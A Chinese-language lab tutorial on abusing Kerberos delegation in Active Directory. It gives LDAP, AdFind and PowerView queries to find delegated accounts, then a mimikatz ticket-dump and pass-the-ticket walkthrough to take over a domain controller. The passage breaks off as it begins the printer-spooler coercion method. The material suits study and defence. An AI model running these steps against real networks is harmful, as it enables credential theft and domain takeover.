## 前置知识
域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动
委派主要分为非约束委派`(Unconstrained delegation)`和约束委派`(Constrained
delegation)`两个方式，还有一种是基于资源的约束委派（`Resource Based Constrained
Delegation`）不过不是本文的重点，下面我们来分别介绍一下非约束委派和约束委派这两种方法的利用
## 发现域中委派的用户和计算机
### 原理说明
  * 当服务账号或者主机被设置为非约束性委派时，其`userAccountControl`属性会包含`TRUSTED_FOR_DELEGATION`
  * 当服务账号或者主机被设置为约束性委派时，其`userAccountControl`属性包含`TRUSTED_TO_AUTH_FOR_DELEGATION`，且`msDS-AllowedToDelegateTo`属性会包含被约束的服务
发现域中委派的用户或计算机一般使用的手段是通过`LDAP`协议（全称：`LightweightDirectory Access
Protocol`）然后通过`userAccountControl`属性筛选出符合的用户或计算机，我们可以通过`ADSI`（全称：`ActiveDirectory
Service Interfaces
Editor`）来编辑和修改LDAP，`adsiedit.msc`可以打开`ADSI`编辑器，打开之后我们找到一个设置了非约束委派的用户，可以看到`userAccountControl`属性包含了`TRUSTED_FOR_DELEGATION`
然后我们再看一下约束委派的用户，同样它的`userAccountControl`属性包含了`TRUSTED_TO_AUTH_FOR_DELEGATION`，但是它比非约束委派的用户多了一个`msDS-AllowedToDelegateTo`属性，里面包含了允许委派的服务
下面介绍三种比较常见方法用于查找域中委派的用户和计算机
### 非约束委派的查找
#### ldapsearch
> kali上自带，适合在域外查询
这个参数过多就不一一列举了，需要查阅的`ldapsearch -h`即可
查找域中配置非约束委派的用户：
    ldapsearch -x -H ldap://192.168.141.145:389 -D "CN=qiyou,CN=Users,DC=qiyou,DC=com" -w password -b "DC=qiyou,DC=com" "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" |grep -iE "distinguishedName"
过滤条件
    (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))
查找域中配置非约束委派的主机：
    ldapsearch -x -H ldap://192.168.141.145:389 -D "CN=qiyou,CN=Users,DC=qiyou,DC=com" -w password -b "DC=qiyou,DC=com" "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" |grep -iE "distinguishedName"
**注** ：域控主机账户默认开启非约束委派
过滤条件
    (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))
**注**
：更多LDAP的过滤语法请参考微软的手册：[地址](https://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx?Sort=MostUseful)
**注** ：区别服务用户和主机的区别是`samAccountType=805306368
(0x30000000)`时为用户，`samAccountType=805306369 (0x30000001)`时为主机
#### ADFind
使用参数
    AdFind [switches] [-b basedn] [-f filter] [attr list]
参数说明：
  * -b：指定要查询的根节点
  * -f：LDAP过滤条件
  * attr list：需要显示的属性
查找域中配置非约束委派的用户：
    AdFind.exe -b "DC=qiyou,DC=com" -f "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName
查找域中配置非约束委派的主机：
    AdFind.exe -b "DC=qiyou,DC=com" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName
#### PowerView
查找域中配置非约束委派用户
    Get-NetUser -Unconstrained -Domain qiyou.com |select name
查找域中配置非约束委派的主机：
    Get-NetComputer -Unconstrained -Domain qiyou.com
查询域中配置非约束委派的主机（另外一个版本的powerview）：
    Get-DomainComputer -Unconstrained -Properties distinguishedname,useraccountcontrol -Verbose | ft -Wrap -AutoSize
### 约束委派
#### ldapsearch
查找域中配置约束委派用户
    ldapsearch -x -H ldap://192.168.141.145:389 -D "CN=qiyou,CN=Users,DC=qiyou,DC=com" -w password -b "DC=qiyou,DC=com" "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" |grep -iE "distinguishedName|allowedtodelegateto"
过滤条件
    (&(samAccountType=805306368)(msds-allowedtodelegateto=*))
查找域中配置约束委派的主机：
    ldapsearch -x -H ldap://192.168.141.145:389 -D "CN=qiyou,CN=Users,DC=qiyou,DC=com" -w password -b "DC=qiyou,DC=com" "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" |grep -iE "distinguishedName|allowedtodelegateto"
过滤条件
    (&(samAccountType=805306369)(msds-allowedtodelegateto=*))
#### ADFind
查找域中配置约束委派用户
    AdFind.exe -b "DC=qiyou,DC=com" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto
查找域中配置约束委派的主机：
    AdFind.exe -b "DC=qiyou,DC=com" -f "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto
#### PowerView
**注**
：Powerview有两个版本，一个在dev分支：[地址](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)，一个在master分支：[地址](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
查找域中配置约束委派用户
    Get-DomainUser –TrustedToAuth -domain qiyou.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl
查找域中配置约束委派的主机：
    Get-DomainComputer -TrustedToAuth -Domain qiyou.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize
## 非约束委派的利用
### 概述
非约束委派：当user访问service1时，如果service1的服务账号开启了`unconstrained
delegation`（非约束委派），则当`user`访问`service1`时会将user的`TGT`发送给`service1`并保存在内存中以备下次重用，然后`service1`
就可以利用这张`TGT`以user的身份去访问域内的任何服务（任何服务是指user能访问的服务）了
非约束委派的请求过程（图来自微软手册）：
上图的Kerberos请求描述分为如下步骤：
    1. 用户向`KDC`发送`KRB_AS_REQ`消息请求可转发的`TGT1`。
    2. KDC在`KRB_AS_REP`消息中返回`TGT1`。
    3. 用户根据步骤2中的TGT1请求转发TGT2。
    4. KDC在KRB_TGS_REP消息中为user返回TGT2。
    5. 用户使用步骤2中返回的TGT1向KDC请求Service1的ST（Service Ticket）
    6. TGS在KRB_TGS_REP消息中返回给用户service1的ST。
    7. 用户发送KRB_AP_REQ消息请求Service1，KRB_AP_REQ消息中包含了TGT1和Service1的ST、TGT2、TGT2的SessionKey
    8. service1使用用户发送过来的的TGT2，并以KRB_TGS_REQ的形式将其发送到KDC，以用户的名义请求service2的ST。
    9. KDC在KRB_TGS_REP消息中返回service2到service1的ST，以及service1可以使用的sessionkey。ST将客户端标识为用户，而不是service1。
    10. service1通过KRB_AP_REQ以用户的名义向service2发出请求。
    11. service2响应service1的请求。
    12. 有了这个响应，service1就可以在步骤7中响应用户的请求。
    13. 这里的TGT转发委派机制没有限制service1使用的TGT2是来自哪个服务，所以service1可以以用户的名义向KDC索要任何其他服务的票证。
    14. KDC返回步骤13中请求的ST
    15-16. service1以用户的名义来请求其它服务
**注** ：`TGT1（forwardable TGT）`用于访问`Service1`，`TGT2（forwarded
TGT）`用于访问`Service2`
### 操作
操作环境：
  * 域：`qiyou.com`
  * 域控：windows server 2008R2，主机名：`WIN-QFPHJSM1L7G`，IP：`192.168.141.145`，用户：`administrator`
  * 域内主机：windows server 2008R2，主机名：`DM2008`，IP：`192.168.141.183`，用户：`qiyou`
**注** ：在Windows系统中，只有服务账号和主机账号的属性才有委派功能，普通用户默认是没有的
现在我们将`DM2008`这个主机用户设置为非约束委派（注意是：主机用户而不是服务用户，多谢评论区的`3t2ugg1e`师傅指正）
然后我们以`administrator`的身份通过`WinRM`服务远程连接`DM2008`
**注** ：常见的连接方式还有：MSSQL和IIS，不过我们这里为了方便演示就直接用WinRM了
这个时候域管理员的TGT已经缓存在`DM2008`了，我们用mimikatz即可dump出来
    privilege::debug 
    sekurlsa::tickets /export
可以看到`[0;1622d8]PI:EMAIL`即为域管理`administrator`的TGT
此时我们访问域控是被拒绝的
然后通过ptt将TGT注入到当前会话中
    kerberos::ptt [0;1622d8]PI:EMAIL
成功访问
**注意** ：访问域控要用主机名或者是`FQDN`，使用IP还是会提示`拒绝访问`
如果想执行命令的话，我们可以用`WinRM`服务来远程连接域控服务器
    Enter-PSSession -ComputerName WIN-QFPHJSM1L7G
  * `-ComputerName`指定主机名
  * 如果你WinRM服务端口改了的话，可以用`-Port`指定`WinRM`端口，默认是`5985`
**注** ：`Windows Server 2012`及以上默认是开启WinRM服务的，`Windows Server 2008 R2`需要`winrm
quickconfig -q`来启动`WinRM`服务，还要注意一点就是这条命令运行后会自动添加防火墙策略，防火墙默认会放行5985端口的。
### 非约束委派+Spooler打印机服务
如果只是单纯的非约束委派话需要管理员主动连接，所以在实战环境利用比较鸡肋。
利用非约束委派+Spooler打印机服务可以强制指定的主机进行连接，这个利用场景是`tifkin_`，`enigma0x3`和`harmj0y`在`DerbyCon
2018`提出的
演讲PPT：[地址](https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory)
利用原理：利用Windows打印系统远程协议`（MS-RPRN）`中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN
`RpcRemoteFindFirstPrinterChangeNotification（Ex）`方法强制任何运行了`Spooler`服务的计算机以通过`Kerberos`或`NTLM`对攻击者选择的目标进行身份验证。
请求过程如下：
> 图来源于： breaking-forest-trusts/>
**注** ：`Print Spooler`服务默认是自动运行的
**注** ：我在`windows server
2008`上操作没有成功，不知道是我的问题还是有版本限制，按照上面的原理来说应该是没有版本限制的，不过把域环境重新配置了一遍，域控换成了`windows
server 2012R2`就成功了
操作环境：
  * 域：`test.local`